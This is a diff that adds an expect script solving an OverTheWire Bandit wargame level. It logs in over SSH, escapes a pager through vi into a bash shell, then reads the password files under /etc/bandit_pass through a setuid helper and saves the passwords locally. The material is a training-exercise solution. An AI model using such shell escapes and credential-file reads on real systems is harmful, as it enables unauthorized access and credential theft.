@@ -1,0 +1,69 @@
+#!/usr/bin/expect
+
+spawn ssh bandit26@bandit.labs.overthewire.org -p 2220 -i bandit26.sshkey
+
+expect "(66%)"
+
+send "v"
+
+expect "  "
+
+send ":"
+
+expect ":"
+
+send "set shell=/bin/bash\r"
+
+expect " "
+
+send ":"
+
+expect ":"
+
+send "shell\r"
+
+expect "$ "
+
+send "ls;\r"
+
+expect "$ "
+
+send "./bandit27-do cat /etc/bandit_pass/bandit27;\r"
+
+expect "$ "
+set bandit27_password $expect_out(buffer)
+
+expect "$ "
+
+send "cat /etc/bandit_pass/bandit26;\r"
+
+expect "$ "
+set bandit26_password $expect_out(buffer)
+
+send "exit\r"
+
+expect "  "
+
+send ":"
+
+expect ":"
+
+send "q\r"
+
+expect "(66%)"
+
+send "\r"
+
+expect "(83%)"
+
+send "\r"
+
+set fh [open bandit27 w]
+puts $fh $bandit27_password
+close $fh
+
+set fh [open bandit26 w]
+puts $fh $bandit26_password
+close $fh
+
+interact
